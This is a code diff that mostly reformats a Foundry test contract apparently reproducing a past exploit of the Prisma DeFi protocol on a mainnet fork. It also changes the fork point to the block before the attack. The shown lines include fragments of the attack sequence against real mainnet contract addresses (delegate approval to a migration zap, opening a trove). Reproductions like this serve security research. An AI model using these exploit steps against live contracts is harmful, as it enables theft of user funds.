@@ -26,11 +26,24 @@ interface IERC20 {
     function balanceOf(
         address owner
     ) external view returns (uint256);
-    function allowance(address owner, address spender) external view returns (uint256);
+    function allowance(
+        address owner,
+        address spender
+    ) external view returns (uint256);
 
-    function approve(address spender, uint256 value) external returns (bool);
-    function transfer(address to, uint256 value) external returns (bool);
-    function transferFrom(address from, address to, uint256 value) external returns (bool);
+    function approve(
+        address spender,
+        uint256 value
+    ) external returns (bool);
+    function transfer(
+        address to,
+        uint256 value
+    ) external returns (bool);
+    function transferFrom(
+        address from,
+        address to,
+        uint256 value
+    ) external returns (bool);
 }
 
 interface IMKUSDLoan {
@@ -53,7 +66,10 @@ interface IERC3156FlashBorrower {
 }
 
 interface IBorrowerOperations {
-    function setDelegateApproval(address _delegate, bool _isApproved) external;
+    function setDelegateApproval(
+        address _delegate,
+        bool _isApproved
+    ) external;
 
     function openTrove(
         address troveManager,
@@ -65,7 +81,10 @@ interface IBorrowerOperations {
         address _lowerHint
     ) external;
 
-    function closeTrove(address troveManager, address account) external;
+    function closeTrove(
+        address troveManager,
+        address account
+    ) external;
 }
 
 interface IPriceFeed {
@@ -95,11 +114,10 @@ contract PrismaExploit is Test {
     address public immutable upperHint = 0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A;
     address public immutable lowerHint = 0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F;
 
-    bytes32 private constant attackTx = hex"00c503b595946bccaea3d58025b5f9b3726177bbdc9674e634244135282116c7";
-
     function setUp() public {
         // set up the fork
-        vm.createSelectFork("mainnet", attackTx);
+        // Fork just before the attack block to avoid replaying the tx (some RPCs fail on tx-based forks).
+        vm.createSelectFork("mainnet", 19_532_297 - 1);
 
         // chainlink price feed and balancer vault
         priceFeed = IPriceFeed(0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac);
@@ -171,15 +189,16 @@ contract PrismaExploit is Test {
         IBorrowerOperations(BorrowerOperations).setDelegateApproval(address(MigrateTroveZap), true);
 
         // // open trove
-        IBorrowerOperations(BorrowerOperations).openTrove(
-            address(TroveManager),
-            address(this),
-            5_000_000_325_833_471,
-            1_000_000_000_000_000_000,
-            2_000_000_000_000_000_000_000,
-            address(upperHint),
-            address(lowerHint)
-        );
+        IBorrowerOperations(BorrowerOperations)
+            .openTrove(
+                address(TroveManager),
+                address(this),
+                5_000_000_325_833_471,
+                1_000_000_000_000_000_000,
+                2_000_000_000_000_000_000_000,
+                address(upperHint),
+                address(lowerHint)
+            );
 
         // // another mkUSD loan
         // // // data
